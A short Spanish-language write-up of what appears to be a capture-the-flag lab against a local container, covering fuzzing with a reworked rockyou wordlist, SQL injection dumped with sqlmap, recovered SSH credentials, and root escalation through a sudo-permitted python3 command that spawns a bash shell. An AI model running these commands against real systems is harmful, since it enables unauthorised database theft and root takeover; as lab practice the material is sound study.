## Reconocimiento

Puerto 22 : SSH

Puerto 80 : HTTP

La web es un índex de Apache normal, la versión no es vulnerable. Hago fuzzing y nada, toca investigar. Después de un rato veo que hay que modificar el rockyou.txt para obtener resultados:

```bash
awk '{print toupper(substr($0,1,1)) tolower(substr($0,2))}' /usr/share/wordlists/rockyou.txt > rockyou_capitalized.txt

grep -Ev '[^a-zA-Z0-9/_-]' rockyou_capitalized.txt > clean_wordlist.txt
```

Con eso obtenemos la siguiente ruta:

```bash
http://172.17.0.2/Certificacion/login
```

Es un panel de login tradicional, que al inyectar una SQLI sencilla nos arroja la version de la BD por lo que se confirma que es vulnerable. 

Intercepto la petición y utilizo Sqlmap para automatizar el proceso:

```bash
sqlmap -r request.txt --dbs
```

Encuentro la BD inicio y la tabla personales y la dumpeo:

```bash
sqlmap -r request.txt --batch -D inicio -T personales --threads 10 --dump
```

Encuentro 3 posibles usuarios y 2 posibles contraseñas para SSH.

Podría usar Hydra pero por las pocas combinaciones lo hago manual, encontrando así:

```bash
alejandro:hanka
```

## Escalada

```bash
sudo -l
(ALL) NOPASSWD: /usr/bin/python3
```

Gracias GTFO Bins:

```bash
sudo -u root python3 -c 'import os; os.system("/bin/bash")'
```

Listo.
